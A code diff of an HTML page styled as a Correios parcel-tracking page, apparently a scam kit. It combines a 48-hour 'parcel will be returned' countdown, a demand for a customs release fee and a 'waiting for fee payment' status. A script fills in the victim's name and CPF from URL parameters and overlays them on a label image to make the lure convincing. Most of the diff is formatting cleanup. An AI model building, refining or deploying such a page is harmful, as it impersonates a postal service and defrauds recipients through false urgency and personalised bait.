@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
   <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 
   <link
     href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap"
@@ -22,8 +22,7 @@
     }
 
     @keyframes pulse-urgent {
-      0%,
-      100% {
+      0%, 100% {
         opacity: 1;
       }
 
@@ -67,6 +66,7 @@
   <hr class="border-orange-500" />
 
   <div class="bg-red-600 text-white py-2 px-3 flex items-center justify-center gap-2 flex-nowrap">
+
     <span class="font-bold text-sm pulse-urgent whitespace-nowrap">
       ⚠️ Encomenda será devolvida em
     </span>
@@ -78,6 +78,7 @@
     >
       48:00:00
     </span>
+
   </div>
 
   <div class="p-4">
@@ -85,10 +86,12 @@
     <div class="bg-white rounded-xl shadow-lg overflow-hidden mb-4">
 
       <div class="bg-cyan-700 text-white p-3">
+
         <div class="flex items-center justify-between gap-2">
 
           <div class="min-w-0">
             <p class="text-xs opacity-80">Rastreio</p>
+
             <p class="font-bold text-sm tracking-wider">
               NB484629378BR
             </p>
@@ -99,22 +102,28 @@
           </div>
 
         </div>
+
       </div>
 
       <div class="p-4 border-b border-gray-100">
-        <p class="text-xs text-gray-500 mb-1">Destinatário</p>
+
+        <p class="text-xs text-gray-500 mb-1">
+          Destinatário
+        </p>
 
         <p class="font-bold text-gray-800 uppercase nome"></p>
 
         <p class="text-sm text-gray-600 cpf">
           CPF:
         </p>
+
       </div>
 
       <div class="p-4 grid grid-cols-2 gap-4 border-b border-gray-100">
 
         <div>
           <p class="text-xs text-gray-500">Origem</p>
+
           <p class="font-semibold text-gray-800 text-sm">
             São Paulo/SP
           </p>
@@ -122,6 +131,7 @@
 
         <div>
           <p class="text-xs text-gray-500">Local</p>
+
           <p class="font-semibold text-gray-800 text-sm">
             Curitiba/PR
           </p>
@@ -145,45 +155,49 @@
 
       </div>
 
+      <!-- ETIQUETA -->
       <div class="p-4 border-b border-gray-100">
 
-        <div class="relative inline-block overflow-hidden">
+        <div class="relative inline-block">
 
-          <!-- TEXTO ATRÁS -->
+          <img
+            src="images/post.png"
+            alt="Pacote"
+            class="max-w-full h-auto rounded-lg shadow-lg"
+          />
+
+          <!-- NOME -->
           <div
             id="nome-repetido"
-            class="absolute top-[168px] left-[58px] w-[210px] text-[11px] font-normal leading-[13px] uppercase break-words z-0"
+            class="absolute top-[168px] left-[58px] w-[180px] text-[11px] leading-[13px] uppercase break-words"
             style="
-              color: rgba(0,0,0,0.72);
+              color: rgba(0,0,0,0.68);
+              font-weight: 400;
               letter-spacing: 0.2px;
             "
           >
             Nome não disponível
           </div>
 
+          <!-- CPF -->
           <div
             id="cpf-repetido"
-            class="absolute top-[248px] left-[112px] text-[11px] font-normal z-0"
+            class="absolute top-[248px] left-[112px] text-[11px]"
             style="
-              color: rgba(0,0,0,0.72);
+              color: rgba(0,0,0,0.68);
+              font-weight: 400;
               letter-spacing: 0.3px;
             "
           >
             CPF não disponível
           </div>
 
-          <!-- IMAGEM POR CIMA -->
-          <img
-            src="images/post.png"
-            alt="Pacote"
-            class="max-w-full h-auto rounded-lg shadow-lg relative z-10"
-          />
-
         </div>
 
       </div>
 
       <div class="p-3 bg-amber-50">
+
         <p class="font-bold text-gray-800 text-sm text-center">
           ⚠️ Taxa de Liberação Aduaneira
         </p>
@@ -191,6 +205,7 @@
         <p class="text-xs text-gray-600 mt-1 text-center">
           Pague a taxa para liberar sua encomenda.
         </p>
+
       </div>
 
       <div class="p-4">
@@ -239,6 +254,7 @@
           </div>
 
           <div class="flex-1">
+
             <p class="font-bold text-red-600 text-sm">
               Aguardando Pagamento da Taxa
             </p>
@@ -246,6 +262,7 @@
             <p class="text-xs text-gray-500 js-dt" data-offset-min="0">
               07/05/2026 14:39
             </p>
+
           </div>
 
         </div>
@@ -285,9 +302,11 @@
     <div class="max-w-6xl mx-auto">
 
       <div class="text-center mt-6 pt-4 border-t border-yellow-500">
+
         <p class="text-sm text-gray-800">
           © Copyright 2025 Correios
         </p>
+
       </div>
 
     </div>
@@ -362,12 +381,12 @@
 
       const params = new URLSearchParams(window.location.search);
 
-      const nome = params.get('nome') || '';
-      const cpf = params.get('cpf') || '';
+      const nome = params.get("nome") || "";
+      const cpf = params.get("cpf") || "";
 
       function formatCPF(cpf) {
 
-        cpf = cpf.replace(/\D/g, '');
+        cpf = cpf.replace(/\D/g, "");
 
         if (cpf.length !== 11) {
           return cpf;
@@ -375,26 +394,26 @@
 
         return cpf.replace(
           /(\d{3})(\d{3})(\d{3})(\d{2})/,
-          '$1.$2.$3-$4'
+          "$1.$2.$3-$4"
         );
       }
 
       const nomeFormatado = decodeURIComponent(
-        nome.replace(/\+/g, ' ')
+        nome.replace(/\+/g, " ")
       );
 
       const cpfFormatado = cpf
         ? formatCPF(cpf)
-        : '';
+        : "";
 
-      const nomeEl = document.querySelector('.nome');
-      const cpfEl = document.querySelector('.cpf');
+      const nomeEl = document.querySelector(".nome");
+      const cpfEl = document.querySelector(".cpf");
 
       const nomeRepetidoEl =
-        document.getElementById('nome-repetido');
+        document.getElementById("nome-repetido");
 
       const cpfRepetidoEl =
-        document.getElementById('cpf-repetido');
+        document.getElementById("cpf-repetido");
 
       if (nomeEl) {
         nomeEl.textContent = nomeFormatado;
@@ -403,20 +422,20 @@
       if (cpfEl) {
 
         cpfEl.textContent = cpfFormatado
-          ? 'CPF: ' + cpfFormatado
-          : 'CPF não disponível';
+          ? "CPF: " + cpfFormatado
+          : "CPF não disponível";
       }
 
       if (nomeRepetidoEl) {
 
         nomeRepetidoEl.textContent =
-          nomeFormatado || 'Nome não disponível';
+          nomeFormatado || "Nome não disponível";
       }
 
       if (cpfRepetidoEl) {
 
         cpfRepetidoEl.textContent =
-          cpfFormatado || 'CPF não disponível';
+          cpfFormatado || "CPF não disponível";
       }
 
     })();
